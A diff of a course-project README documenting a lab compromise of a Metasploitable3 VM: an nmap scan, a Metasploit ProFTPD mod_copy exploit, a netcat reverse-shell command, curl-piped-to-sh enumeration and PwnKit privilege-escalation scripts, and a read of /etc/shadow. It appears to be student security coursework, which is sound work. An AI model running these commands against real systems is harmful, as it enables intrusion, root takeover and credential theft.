@@ -1,241 +1,203 @@
-📚 Phase 1: Setup, Service Compromise, and Custom Exploitation
-🛠️ 1. Environment Setup
-1.1 Import Victim VM (Metasploitable3)
-Download .ova file from SourceForge Metasploitable3 Repository.
+# 📚 Phase 1: Setup and Compromise the Service
 
-Open VirtualBox → File → Import Appliance.
+---
 
-Select .ova file and customize VM settings (RAM = 2048MB, CPU = 2).
+## 🛠️ 1. Environment Setup
 
-Import completed successfully.
+### 1.1 Import Victim VM (Metasploitable3)
 
-Screenshots:
+- Downloaded `.ova` file from [SourceForge](https://sourceforge.net/projects/metasploitable3-ub1404upgraded/files/)
+- Open VirtualBox → File → Import Appliance
+- Customized settings (RAM=2048MB, CPU=2)
 
+**Screenshots:**
+- ![1-virtualbox_attacker_machine.png](./screenshots/1-virtualbox_attacker_machine.png)
+- ![2-import_appliance_option.png](./screenshots/2-import_appliance_option.png)
+- ![3-select_metasploitable3_ova.png](./screenshots/3-select_metasploitable3_ova.png)
+- ![4-import_appliance_settings.png](./screenshots/4-import_appliance_settings.png)
+- ![5-import_progress.png](./screenshots/5-import_progress.png)
 
+---
 
+### 1.2 Boot the Victim VM
 
+- Started VM with credentials:
+  - `username: vagrant`
+  - `password: vagrant`
 
+**Screenshot:**
+- ![6-metasploitable3_login_success.png](./screenshots/6-metasploitable3_login_success.png)
 
+---
 
+### 1.3 Obtain Victim IP Address
 
+- Victim (Metasploitable3) IP: `10.0.2.15`
+- Attacker (Kali) IP: `10.0.2.6`
 
+**Screenshots:**
+- ![7-ifconfig_command.png](./screenshots/7-ifconfig_command.png)
+- ![8-victim_ip_found.png](./screenshots/8-victim_ip_found.png)
 
+---
 
-1.2 Boot the Victim VM
-Start the imported VM.
+### 1.4 Confirm Network Connectivity
 
-Login credentials:
-
-Username: vagrant
-
-Password: vagrant
-
-Screenshot:
-
-
-
-1.3 Obtain Victim IP Address
-Inside Metasploitable3, run:
-
-bash
-Copy
-Edit
-ifconfig
-Obtained IP address: 10.0.2.15
-
-Screenshots:
-
-
-
-
-
-1.4 Confirm Network Connectivity
-From Kali (attacker machine):
-
-bash
-Copy
-Edit
+- Pinged victim from attacker:
+```bash
 ping 10.0.2.15
-Ping successful — confirming internal network connection (NAT Network).
+```
 
-Screenshot:
+**Screenshot:**
+- ![9-kali_ping_success.png](./screenshots/9-kali_ping_success.png)
 
+---
 
+# 💣 2. TASK 1.1: Compromise Service Using Metasploit
 
-💣 2. TASK 1.1: Compromise Service Using Metasploit
-2.1 Scan Victim with Nmap
-In Kali VM:
+---
 
-bash
-Copy
-Edit
+## 2.1 Scan Victim with Nmap
+
+```bash
 nmap -sV 10.0.2.15
-Discovered open services: FTP (ProFTPD 1.3.5) on port 21.
+```
+- Discovered ProFTPD 1.3.5 on port 21
 
-Screenshot:
+**Screenshot:**
+- ![10-nmap_scan_results.png](./screenshots/10-nmap_scan_results.png)
 
+---
 
-📝 GitHub Comment:
-"Scanned victim machine to discover services. FTP ProFTPD 1.3.5 detected on port 21, vulnerable to known exploits."
+## 2.2 Launch Metasploit Console
 
-2.2 Start Metasploit Console
-In Kali VM:
-
-bash
-Copy
-Edit
+```bash
 sudo msfconsole
-Screenshot:
+```
 
+**Screenshot:**
+- ![11-start_msfconsole.png](./screenshots/11-start_msfconsole.png)
 
-📝 GitHub Comment:
-"Launched Metasploit Framework for exploitation."
+---
 
-2.3 Search for FTP Exploit (mod_copy)
-Inside Metasploit:
+## 2.3 Search and Use Exploit
 
-bash
-Copy
-Edit
+```bash
 search mod_copy
-Found exploit: exploit/unix/ftp/proftpd_modcopy_exec.
-
-Select it using:
-
-bash
-Copy
-Edit
 use 0
-Screenshot:
+```
 
+**Screenshot:**
+- ![12-search_and_use_modcopy_exploit.png](./screenshots/12-search_and_use_modcopy_exploit.png)
 
-📝 GitHub Comment:
-"Selected proftpd_modcopy_exec exploit module targeting ProFTPD service."
+---
 
-2.4 Configure Exploit Options
-Set target IP and writable site path:
+## 2.4 Configure Exploit Options
 
-bash
-Copy
-Edit
+```bash
 set RHOSTS 10.0.2.15
 set SITEPATH /var/www/html
-Screenshot:
+```
 
+**Screenshot:**
+- ![13-configure_rhosts_sitepath.png](./screenshots/13-configure_rhosts_sitepath.png)
 
-📝 GitHub Comment:
-"Set victim IP and writable FTP path for payload delivery."
+---
 
-2.5 Set Payload and Command
-Set the payload and reverse shell command:
+## 2.5 Configure Payload and Reverse Shell Command
 
-bash
-Copy
-Edit
-set payload cmd/unix/generic
+```bash
+set payload 5
 set LHOST 10.0.2.6
 set LPORT 4444
 set CMD /tmp/mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.6 4444 > /tmp/f
-Screenshot:
+```
 
+**Screenshot:**
+- ![14-set_payload_and_reverse_shell_command.png](./screenshots/14-set_payload_and_reverse_shell_command.png)
 
-📝 GitHub Comment:
-"Configured generic Unix reverse shell payload connecting back to attacker's Netcat listener."
+---
 
-2.6 Start Netcat Listener (Terminal A)
-In a new Kali terminal:
+## 2.6 Start Netcat Listener (Terminal A)
 
-bash
-Copy
-Edit
+```bash
 nc -lnvp 4444
-Screenshot:
+```
 
+**Screenshot:**
+- ![15-start_nc_listener.png](./screenshots/15-start_nc_listener.png)
 
-📝 GitHub Comment:
-"Started Netcat listener on attacker's machine awaiting shell connection."
+---
 
-2.7 Launch Exploit (Terminal B)
-In Metasploit terminal:
+## 2.7 Run Exploit (Terminal B)
 
-bash
-Copy
-Edit
+```bash
 run
-Screenshot:
+```
 
+**Screenshot:**
+- ![16-run_exploit.png](./screenshots/16-run_exploit.png)
 
-📝 GitHub Comment:
-"Triggered the exploit. Payload sent successfully. Awaiting reverse shell connection."
+---
 
-2.8 Confirm Reverse Shell Access
-Once the session is received, confirm shell access:
+## 2.8 Confirm Reverse Shell Access
 
-bash
-Copy
-Edit
+```bash
 whoami
 ls
-Screenshot:
+```
 
+**Screenshot:**
+- ![17-confirm_shell_access.png](./screenshots/17-confirm_shell_access.png)
 
-📝 GitHub Comment:
-"Reverse shell session established. Accessed victim as www-data user."
+---
 
-🛠️ 3. TASK 1.2: Custom Exploitation and Privilege Escalation
-3.1 Enumerate System with Custom LinPEAS Script
-Inside the shell session:
+# 🛠️ 3. TASK 1.2: Custom Scripts & Privilege Escalation
 
-bash
-Copy
-Edit
+---
+
+## 3.1 Run Custom Enumeration Script (lightpeas.sh)
+
+```bash
 curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/lightpeas.sh | sh
-Screenshot:
+```
 
+**Screenshot:**
+- ![18-run_lightpeas_script.png](./screenshots/18-run_lightpeas_script.png)
 
-📝 GitHub Comment:
-"Executed custom lightpeas.sh script to enumerate victim system for privilege escalation opportunities."
+---
 
-3.2 Exploit Privilege Escalation with Custom Exploit
-Inside the shell session:
+## 3.2 Execute Custom Privilege Escalation (escalate.sh)
 
-bash
-Copy
-Edit
+```bash
 sh -c "$(curl -fsSL https://raw.githubusercontent.com/A0-2H/ICS344-CourseProject/main/phase1/custom/escalate.sh)"
-The script:
+```
 
-Downloads ExploitRoot.c.
+**Screenshot:**
+- ![19-run_escalate_script.png](./screenshots/19-run_escalate_script.png)
 
-Compiles it.
+---
 
-Executes the privilege escalation.
+## 3.3 Confirm Root Access
 
-Screenshot:
-
-
-📝 GitHub Comment:
-"Ran custom escalate.sh automation script. Downloaded, compiled, and executed ExploitRoot.c to escalate privileges."
-
-3.3 Confirm Root Access
-After successful exploitation:
-
-bash
-Copy
-Edit
+```bash
 whoami
 cat /etc/shadow
-Screenshot:
+```
 
+**Screenshot:**
+- ![20-confirm_root_access.png](./screenshots/20-confirm_root_access.png)
 
-📝 GitHub Comment:
-"Privilege escalation successful. Gained root access and retrieved contents of /etc/shadow."
+---
 
-📦 Custom Scripts Used
+# 📆 Custom Scripts Used
 
-File	Description
-lightpeas.sh	Custom enumeration tool based on LinPEAS
-ExploitRoot.c	C-based custom exploit based on PwnKit (CVE-2021-4034)
-escalate.sh	Shell automation script that downloads, compiles, and runs ExploitRoot.c
-✅ All scripts are located inside:
-phase1/custom/
+| Script | Purpose |
+|:------|:--------|
+| `lightpeas.sh` | Local enumeration script (gather system info) |
+| `ExploitRoot.c` | Custom compiled PwnKit-based root exploit |
+| `escalate.sh` | Automated script to compile and run ExploitRoot.c |
+
+✅ Located at: `phase1/custom/`
+
+---
